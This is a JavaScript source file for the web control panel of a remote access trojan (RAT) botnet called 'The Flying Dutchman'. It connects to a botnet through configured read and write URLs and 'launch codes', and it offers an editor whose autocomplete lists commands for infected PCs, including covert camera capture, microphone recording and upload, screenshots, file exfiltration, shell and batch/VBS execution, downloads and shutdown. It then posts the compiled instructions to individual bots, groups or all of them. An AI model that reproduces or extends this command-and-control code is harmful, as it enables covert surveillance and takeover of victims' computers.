// TODO Keyboard shortcuts and client cutsom macros

maxie(4); // Default Layout
$("div.split-pane").splitPane(); //draggable handles

// Soundtrack Code [Assets]
var trackElm, trackID;

// TODO: TrackElm Add Class
const stereo = (elmnt, traq) => {
 trackElm = elmnt;
 trackID = traq;
 if (trackElm.textContent == "Pause") {
  document.getElementById("reel").pause();
  trackElm.textContent = "Play";
  trackElm.style.color = "#800080";
  trackElm.style.fontWeight = "normal";
 } else {
  $(".audi").each(function () {
   $(this).text("Play");
   $(this).css("color", "#800080");
   $(this).css("font-weight", "normal");
  });
  trackElm.textContent = "loading";
  trackElm.setAttribute("onclick", "");
  trackElm.style.textDecoration = "none";
  document.getElementById("reel").src = "Assets/" + traq + ".mp3";
  document.getElementById("reel").load();
  document.getElementById("reel").play();
 }
};

const audioLoaded = () => {
 trackElm.textContent = "Pause";
 trackElm.style.color = "#42555f";
 trackElm.style.fontWeight = "bold";
 trackElm.style.textDecoration = "underline";
 trackElm.setAttribute("onclick", 'stereo(this,"' + trackID + '")');
};
const donePlaying = () => {
 trackElm.textContent = "Play";
 trackElm.style.color = "#800080";
 trackElm.style.fontWeight = "normal";
};

const istereo = (x) => {
 editor.navigateLineEnd();
 editor.session.insert(editor.getCursorPosition(), '\nPC.Play("https://raw.githubusercontent.com/A5H1Q/The-Flying-Dutchman/master/Assets/' + x + '.mp3");');
};

// Manage Connections
var rData;
var opCode = "";
var hash = "Al1ce";
var conToast = undefined;
// General Format: [0:isConnected, 1:isAutomatic, 2:isCompilable, 3:isFormatted, 4:inDelay_in_milliseconds,5:target,6:mode (1: Specific PC |2: Class |3: All Systems)]
var ctrlFlags = [false, true, true, true, 5000, "", 1];
// var readURL, writeURL, lCodes;
// readURL = writeURL = lCodes = "";
var webWorker = new Worker("./js/webworkers/request.js");

const promptBox = (x) => {
 if (x == 0) {
  readURL = prompt("Enter URL for Read Operation: ", readURL);
 } else if (x == 1) {
  writeURL = prompt("Enter URL for Write Operation: ", writeURL);
 } else if (x == 2) {
  lCodes = prompt("Enter Launch Codes: ", lCodes);
 } else {
  ctrlFlags[4] = parseInt(prompt("Enter Delay in milliseconds", "5000"), 10);
 }
};

const connect = () => {
 // TODO: URL Validator
 if (readURL === "") {
  let idToast = undefined;
  idToast = toast.publish({
   type: "danger",
   description: " Missing Value for Read URL.\nPlease configure your connection and try again",
   timeout: 0,
   actions: [
    {
     title: " ADD URL",
     onClick: function () {
      promptBox(0);
      toast.remove(idToast);
      connect();
     },
    },
   ],
  });
 } else if (writeURL === "") {
  let idToast = undefined;
  idToast = toast.publish({
   type: "danger",
   description: " Missing Value for Write URL.\nPlease configure your connection and try again",
   timeout: 0,
   actions: [
    {
     title: " ADD URL",
     onClick: function () {
      promptBox(1);
      toast.remove(idToast);
      connect();
     },
    },
   ],
  });
 } else if (lCodes === "") {
  let idToast = undefined;
  idToast = toast.publish({
   type: "danger",
   description: " Missing Launch Codes.\nPlease configure your connection and try again",
   timeout: 0,
   actions: [
    {
     title: " ENTER CODE",
     onClick: function () {
      promptBox(2);
      toast.remove(idToast);
      connect();
     },
    },
   ],
  });
 } else {
  // Proceed to Connect -->
  conToggle(2); // Loading...
  conToast = toast.publish({
   type: "tower",
   hideClose: true,
   description: " Establishing Connection to Botnet",
   timeout: 10000,
  });
  webWorker.postMessage([readURL, true]);
 }
};

const conError = () => {
 conToggle(0);
 let idToast = toast.publish({
  type: "danger",
  description: " Connection Failed.\nPlease check your url configurations.",
  timeout: 0,
  actions: [
   {
    title: " OK",
    onClick: function () {
     toast.remove(idToast);
    },
   },
  ],
 });
};

const conToggle = (x) => {
 if (x == 0) {
  document.getElementById("conLabel").classList.remove("nohover");
  document.getElementById("nocLabel").classList.add("nohover");
  document.getElementById("cDot").setAttribute("class", "idot redDot");
  document.getElementById("inspector-toolbar").setAttribute("class", "windows-menubar nohover");
  document.getElementById("conStat").textContent = "Disconnected";
  document.getElementById("statusbar").style.display = "none";
  document.getElementById("spinner").style.display = "none";
  document.getElementById("holmes").innerHTML = "<div id='rudy'>Disconnected from Botnet</div>";
  ctrlFlags[0] = false;
 } else if (x == 1) {
  document.getElementById("conLabel").classList.add("nohover");
  document.getElementById("nocLabel").classList.remove("nohover");
  document.getElementById("inspector-toolbar").setAttribute("class", "windows-menubar");
  document.getElementById("conStat").textContent = "Connected";
  document.getElementById("statusbar").style.display = "block";
  showStatus();
  ctrlFlags[0] = true;
 } else {
  document.getElementById("conLabel").classList.add("nohover");
  document.getElementById("nocLabel").classList.add("nohover");
  document.getElementById("cDot").setAttribute("class", "idot ylwDot blinks");
  document.getElementById("inspector-toolbar").setAttribute("class", "windows-menubar nohover");
  document.getElementById("conStat").textContent = "Trying to Connect..";
  document.getElementById("statusbar").style.display = "none";
  document.getElementById("holmes").innerHTML = "<div id='rudy'>Attempting to connect...</div>";
  ctrlFlags[0] = false;
 }
};

const checkMode = () => {
 if (ctrlFlags[0]) {
  // Conneted
  if (ctrlFlags[1]) {
   // Automatic Polling
   setTimeout(function () {
    if (ctrlFlags[1] && ctrlFlags[0]) {
     // Reason for repeating extra condition statemnt: because ctrlFlags[4] value is varying.
     document.getElementById("spinner").style.display = "block";
     document.getElementById("statusbar").textContent = "Updating..";
     document.getElementById("holmes").innerHTML = "";
     initReq();
    }
   }, ctrlFlags[4]);
  }
 } else {
  conError(); // Not Conneted
 }
};

const initReq = () => {
 webWorker.postMessage([readURL, false]);
};

const parseData = (x, y) => {
 if (x.values) {
  if (x.values[0][0] == "DUTCHMAN") {
   if (y) {
    toast.publish({
     type: "success",
     hideClose: true,
     description: " Successfully Connected to RAT Network",
     timeout: 3000,
    });
    conToggle(1);
   }
   if (hash != x.values[1][0] && x.values[4][0] == "1") {
    hash = x.values[1][0];
    let idToast = toast.publish({
     type: "user",
     description: x.values[5][0],
     timeout: 0,
     actions: [
      {
       title: " OK",
       onClick: function () {
        toast.remove(idToast);
       },
      },
     ],
    });
   }
   if (ctrlFlags[3]) {
    // Formatted Mode
    document.getElementById("holmes").innerHTML = "";
    for (let i = 1; i < x.values.length; i++) {
     document.getElementById("holmes").innerHTML += `<div class="line line-${x.values[2][0]}">${x.values[i][0]}</div>`;
    }
    document.getElementById("holmes").innerHTML += '<div class="line">&nbsp;</div>';
   }
  } else {
   conError();
  }
 } else {
  conError();
 }

 if (!ctrlFlags[3]) {
  // Unformatted Mode
  document.getElementById("holmes").textContent = JSON.stringify(x);
 }
 if (document.getElementById("spinner").style.display == "block") {
  document.getElementById("spinner").style.display = "none";
  showStatus();
 }
};

webWorker.onmessage = function (event) {
 // General Format:  [isError, Response_data, isInitial(passthru value)]
 event.data[2] && toast.remove(conToast);
 if (event.data[0]) {
  conError();
 } else {
  rData = event.data[1];
  parseData(event.data[1], event.data[2]);
  checkMode();
 }
};

// [Editor]
var hotrelod = true;
var fileName = "Untitled.fdm";
var lexWorker = new Worker("./js/webworkers/compiler.js");
var editor = ace.edit("editor");
editor.getSession().setMode("ace/mode/javascript");
editor.container.style.lineHeight = 1.7;
editor.setOptions({
 theme: "ace/theme/clouds",
 wrap: true,
 showPrintMargin: false,
 fontSize: "13px",
 maxLines: Infinity,
 enableBasicAutocompletion: true,
 enableLiveAutocompletion: true,
 //  showGutter: true,
});
var fst = {};
var wordList = [
 {helper: "All();", value: "All();", args: false, meta: " Selects All system"},
 {helper: 'Class("");', value: "Class();", args: true, meta: " Selects a Group"},
 {helper: 'Lock("");', value: "Lock();", args: true, meta: " Select Target"},

 {helper: "Marco();", value: "Marco();", args: false, meta: " Returns Polo!"},
 {helper: "Details();", value: "Details();", args: false, meta: " Retrieves PC Info"},
 {helper: "Log();", value: "Log();", args: false, meta: " List of Active applications."},
 {helper: "Disk();", value: "Disk();", args: false, meta: " Disk Summary"},
 {helper: "Health();", value: "Health();", args: false, meta: " Working conditions"},

 {helper: "Escape();", value: "Escape();", args: false, meta: " Escape operation"},
 {helper: "Exit();", value: "Exit();", args: false, meta: " End Process"},
 {helper: "Revive();", value: "Revive();", args: false, meta: " End Hibernation  "},
 {helper: "Flash();", value: "Flash();", args: false, meta: " Flash Screen"},
 {helper: "NClone();", value: "NClone();", args: false, meta: " End Cloning"},

 {helper: 'Rename("");', value: "Rename();", args: true, meta: " Renames RAT"},
 {helper: 'Camera("https://www...");', value: "Camera();", args: true, meta: " Captures a Photo"},
 {helper: 'Mic("https://www...",1);', value: "Mic();", args: true, meta: " Record audio and upload"},
 {helper: 'Tree("C:\\..");', value: "Tree();", args: true, meta: " Folder structures"},
 {helper: 'Send("https://www...");', value: "Send();", args: true, meta: " Uplinks a file"},
 {helper: 'Prompt("What is your body count..");', value: "Prompt();", args: true, meta: " Input prompt"},
 {helper: 'Clone("Name","https://www...");', value: "Clone();", args: true, meta: " Initiate Clone Operations"},

 {helper: 'Update("");', value: "Update();", args: true, meta: " Updates firmware"},
 {helper: 'Hibernate("15-01-2030");', value: "Hibernate();", args: true, meta: " Hibernate till date"},
 {helper: 'Excape("echo Good bye...");', value: "Excape();", args: true, meta: " Execute and Escape"},
 {helper: 'Shell("echo %username%");', value: "Shell();", args: true, meta: " Runs Commands"},
 {helper: 'Speak("Hello...");', value: "Speak();", args: true, meta: " Text to Speech"},
 {helper: 'Play("http://...");', value: "Play();", args: true, meta: " Play Audio file"},
 {helper: 'Info("This is an Información..");', value: "Info();", args: true, meta: " Shows Info box"},
 {helper: 'Warn("This is an Warning..");', value: "Warn();", args: true, meta: " Shows Warning Box"},
 {helper: 'Error("This is an Error..");', value: "Error();", args: true, meta: " Shows Error box"},
 {helper: 'Google("Hi, How are you doing?..");', value: "Google();", args: true, meta: " Googles query"},
 {helper: 'Web("https://www.google.com");', value: "Web();", args: true, meta: " Navigates to URL."},
 {helper: 'Type("Hello, My name is Casper..");', value: "Type();", args: true, meta: " Types string"},
 {helper: 'Screenshot("https://www...");', value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
 {helper: "Delay(5000);", value: "Delay();", args: true, meta: " Execution breaks"},
 {helper: "Shutdown(3500);", value: "Shutdown();", args: true, meta: " Shutdown system"},
 {helper: 'Download("https://www...");', value: "Download();", args: true, meta: " Downloads a file"},
 {helper: 'ExecuteAt("14:59");', value: "ExecuteAt();", args: true, meta: " Executes at custom time."},
 {helper: 'Timebox("Message Here..",0,16,"Title..",5000);', value: "Timebox();", args: true, meta: " Timed Message Box"},
 {
  helper: `Vbs(\`
X=Msgbox("Message Here..",0+16,"TitleHere..")
\`);`,
  value: "Vbs();",
  args: true,
  meta: " Runs .VBS Script",
 },
 {
  helper: `Bat(\`
@echo off
REM This is a comment.
echo Hola!
pause
\`);`,
  value: "Bat();",
  args: true,
  meta: " Runs .Bat Script",
 },
];

var staticWordCompleter = {
 getCompletions: function (editor, session, pos, prefix, callback) {
  let line = session.getLine(pos.row);
  let lineStart = line.slice(0, pos.column - prefix.length);
  if (/PC\.\s*$/.test(lineStart)) {
   //  TODO editor.getCursorPosition()+1 == EOL
   if (prefix.length == 0) {
    fst = pos;
   }

   callback(
    null,
    wordList.map((item) => {
     return {
      value: item.value,
      meta: item.meta,
      score: 1000,
      completer: {
       insertMatch: function (editor, data) {
        data.value = item.helper;
        if (prefix.length != 0) {
         editor.session.remove({start: fst, end: {row: pos.row, column: fst.column + prefix.length}});
        }
        editor.session.insert(editor.getCursorPosition(), data.value);
        if (item.args) {
         editor.gotoLine(pos.row + 1, fst.column + data.value.length - 3);
        }
       },
      },
     };
    })
   );
  }
 },
};
editor.completers = [staticWordCompleter];

var doLiveAutocomplete = function (e) {
 var editor = e.editor;
 if (e.command.name === "insertstring") {
  if (/[\w.]/.test(e.args)) {
   editor.execCommand("startAutocomplete");
  }
 }
};

editor.commands.on("afterExec", doLiveAutocomplete);

// Initial Program
editor.getSession().setValue(`// |================================================|\n// | Program-1\n// | Description: Checks if a RAT is Online\n// | Response: POLO!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Marco(); // Returns Polo if Online\n \n`);
editor.on("change", function (e) {
 hotrelod && lexWorker.postMessage(editor.getValue());
});
editor.on("focus", function () {
 winFocus(2);
});
editor.on("blur", function () {
 winBlur(2);
});

lexWorker.postMessage(editor.getValue()); //Initial Compilation
lexWorker.onmessage = function (event) {
 // Message Format :
 //event.data[0]    -  Compiler errors? (true=errors, false=no-errors)
 //event.data[1]    -  Main Info (eval-output)
 //event.data[2]    -  Additional Info (markups)
 //event.data[3]    -  Target Name (If exist)
 //event.data[4]    -  mode //1: Specific PC |2: Class |3: All Systems
 //event.data[5]    -  Optimized code

 document.getElementById("vim").textContent = `>> run -i ${fileName}\n\n${event.data[1]}`;
 document.getElementById("vim").innerHTML += `<br><br>${event.data[2]}<br><br>>>`;
 if (!event.data[0]) {
  document.getElementById("run").setAttribute("class", "menubar-item");
  document.getElementById("device").textContent = "Run on '" + event.data[3] + "'";
  ctrlFlags[5] = event.data[3];
  ctrlFlags[6] = event.data[4];
  opCode = event.data[5];
 } else {
  document.getElementById("run").setAttribute("class", "menubar-item nohover");
 }
};

const reLoad = () => {
 document.getElementById("spinner").style.display = "block";
 document.getElementById("statusbar").textContent = "Updating..";
 document.getElementById("holmes").innerHTML = "";
 initReq();
};

const deploy = () => {
 if (!ctrlFlags[0]) {
  let idToast = toast.publish({
   type: "danger",
   description: " Not connected to Botnet.",
   timeout: 0,
   actions: [
    {
     title: " CONNECT",
     onClick: function () {
      toast.remove(idToast);
      connect();
     },
    },
   ],
  });
 } else {
  conToast = toast.publish({
   type: "tower",
   hideClose: true,
   description: " Sending Instructions to '" + ctrlFlags[5] + "'",
   timeout: 10000,
  });
  console.log("Sending..");
  fetch(writeURL, {
   method: "POST",
   headers: {
    "Content-Type": "text/plain;charset=utf-8",
   },
   body: JSON.stringify({
    key: lCodes,
    hash: (Math.random() + 1).toString(36).substring(7),
    mode: ctrlFlags[6], //Mode=> 0: Specific PC |1: Class of PC |2: All PC
    name: ctrlFlags[5],
    dir: 0, //0: Normal(S->C) | 1: Response(C->S)
    code: opCode,
   }),
  })
   .then((response) => {
    response.json().then(function (res) {
     console.log(res);
     if (res.done == "yes") {
      toast.publish({
       type: "success",
       hideClose: true,
       description: " Instructions uplinked succesfully ",
       timeout: 3000,
      });
      reLoad();
     } else {
      let idToast = toast.publish({
       type: "danger",
       description: " Server responded with an error",
       timeout: 0,
       actions: [
        {
         title: " OK",
         onClick: function () {
          toast.remove(idToast);
         },
        },
       ],
      });
     }
    });
   })
   .then((data) => {
    // When the fetch is successful
    toast.remove(conToast);
   })
   .catch((error) => {
    // When there is an error
    toast.remove(conToast);
    let idToast = toast.publish({
     type: "danger",
     description: " An error occured while sending..",
     timeout: 0,
     actions: [
      {
       title: " RETRY",
       onClick: function () {
        toast.remove(idToast);
        deploy();
       },
      },
     ],
    });
    console.log(error);
   });
 }
};

// [Inspector]
const formatData = (x) => {
 ctrlFlags[3] = x;
 if (x) {
  document.getElementById("fmt").setAttribute("class", "menubar-item nohover");
  document.getElementById("ufmt").setAttribute("class", "menubar-item");
 } else {
  document.getElementById("ufmt").setAttribute("class", "menubar-item nohover");
  document.getElementById("fmt").setAttribute("class", "menubar-item");
 }
 parseData(rData, false);
};

const showStatus = () => {
 if (ctrlFlags[1]) {
  document.getElementById("statusbar").textContent = " - Automatic, Latency: " + ctrlFlags[4] + "ms";
  document.getElementById("cDot").setAttribute("class", "idot grnDot blinks");
 } else {
  document.getElementById("statusbar").textContent = " - Manual mode";
  document.getElementById("cDot").setAttribute("class", "idot grnDot");
 }
};

const modeSelector = (auto) => {
 if (auto) {
  document.getElementById("autoMode").classList.add("nohover");
  document.getElementById("manMode").classList.remove("nohover");
  document.getElementById("setRelod").classList.remove("nohover");
  document.getElementById("relod").classList.add("nohover");
  ctrlFlags[1] = true;
  showStatus();
  toast.publish({
   type: "info",
   hideClose: true,
   description: " Switched to Automatic Polling mode ",
   timeout: 3000,
  });
  checkMode();
 } else {
  document.getElementById("manMode").classList.add("nohover");
  document.getElementById("autoMode").classList.remove("nohover");
  document.getElementById("relod").classList.remove("nohover");
  document.getElementById("setRelod").classList.add("nohover");
  ctrlFlags[1] = false;
  showStatus();
  toast.publish({
   type: "info",
   hideClose: true,
   description: " Switched to Manual Polling mode ",
   timeout: 3000,
  });
 }
};

// [Compiler]
$(document).ready(function () {
 "use strict";
 var terminal = $(".terminal");
 var commandHistory = [];
 var historyIndex = 0;

 var command = "";
 var commands = [
  {
   name: "cls",
   function: clear,
  },
  {
   name: "read64",
   function: read,
  },
  {
   name: "write64",
   function: write,
  },
  {
   name: "pwd64",
   function: pwd,
  },
  {
   name: "connect",
   function: connect,
  },
  {
   name: "max",
   function: maximize,
  },
  {
   name: "min",
   function: maximize,
  },
  {
   name: "run",
   function: run,
  },
 ];

 function clear() {
  terminal.text("");
 }

 function read(args) {
  let err = false;
  try {
   window.atob(args[0]);
  } catch (e) {
   err = true;
  }
  if (!err) {
   readURL = window.atob(args[0]);
   terminal.append("\nReadURL Configuration Updated..\n\n");
   toast.publish({
    type: "info",
    hideClose: true,
    description: " Updated ReadURL Configuration",
    timeout: 2000,
   });
  } else {
   terminal.append("Invalid base64 encoding..\n\n");
  }
 }
 function write(args) {
  let err = false;
  try {
   window.atob(args[0]);
  } catch (e) {
   err = true;
  }
  if (!err) {
   writeURL = window.atob(args[0]);
   terminal.append("\nWriteURL Configuration Updated..\n\n");
   toast.publish({
    type: "info",
    hideClose: true,
    description: " Updated WriteURL Configuration",
    timeout: 2000,
   });
  } else {
   terminal.append("Invalid base64 encoding..\n\n");
  }
 }
 function pwd(args) {
  let err = false;
  try {
   window.atob(args[0]);
  } catch (e) {
   err = true;
  }
  if (!err) {
   lCodes = window.atob(args[0]);
   terminal.append("\nLaunch Codes Updated..\n\n");
   toast.publish({
    type: "info",
    hideClose: true,
    description: " Launch Codes has been updated..",
    timeout: 2000,
   });
  } else {
   terminal.append("Invalid base64 encoding..\n\n");
  }
 }
 function maximize() {
  winman(1);
 }
 function run() {
  lexWorker.postMessage(editor.getValue());
 }
 function processCommand() {
  var isValid = false;
  // Create args list by splitting the command
  // by space characters and then shift off the
  // actual command.

  var args = command.split(" ");
  var cmd = args[0];
  args.shift();

  // Iterate through the available commands to find a match.
  // Then call that command and pass in any arguments.
  if (cmd != "") {
   for (let i = 0; i < commands.length; i++) {
    if (cmd === commands[i].name) {
     commands[i].function(args);
     isValid = true;
     break;
    }
   }

   // No match was found...
   if (!isValid) {
    // command
    terminal.append("unknown command: " + command + "\n");
   }

   commandHistory.push(command);
   historyIndex = commandHistory.length;
   command = "";
  }
 }

 function displayPrompt() {
  terminal.append('<span class="path">>></span>');
 }

 // Delete n number of characters from the end of our output
 function erase(n) {
  command = command.slice(0, -n);
  terminal.html(terminal.html().slice(0, -n));
 }

 function clearCommand() {
  if (command.length > 0) {
   erase(command.length);
  }
 }

 function appendCommand(str) {
  terminal.append(str);
  command += str;
 }

 $(".shell").on("keydown", function (e) {
  e = e || window.event;
  var keyCode = typeof e.which === "number" ? e.which : e.keyCode;

  // BACKSPACE
  if (keyCode === 8 && e.target.tagName !== "INPUT" && e.target.tagName !== "TEXTAREA") {
   e.preventDefault();
   if (command !== "") {
    erase(1);
   }
  }

  // UP or DOWN
  if (keyCode === 38 || keyCode === 40) {
   // Move up or down the history
   if (keyCode === 38) {
    // UP
    historyIndex--;
    if (historyIndex < 0) {
     historyIndex++;
    }
   } else if (keyCode === 40) {
    // DOWN
    historyIndex++;
    if (historyIndex > commandHistory.length - 1) {
     historyIndex--;
    }
   }

   // Get command
   var cmd = commandHistory[historyIndex];
   if (cmd !== undefined) {
    clearCommand();
    appendCommand(cmd);
   }
  }
 });

 $(".shell").on("keypress", function (e) {
  // Make sure we get the right event
  e = e || window.event;
  var keyCode = typeof e.which === "number" ? e.which : e.keyCode;

  // Which key was pressed?
  switch (keyCode) {
   // ENTER
   case 62:
    break;
   case 60:
    break;
   case 38:
    break;
   case 13: {
    terminal.append("\n");

    processCommand();
    displayPrompt();
    break;
   }
   default: {
    appendCommand(String.fromCharCode(keyCode));
   }
  }
 });
});
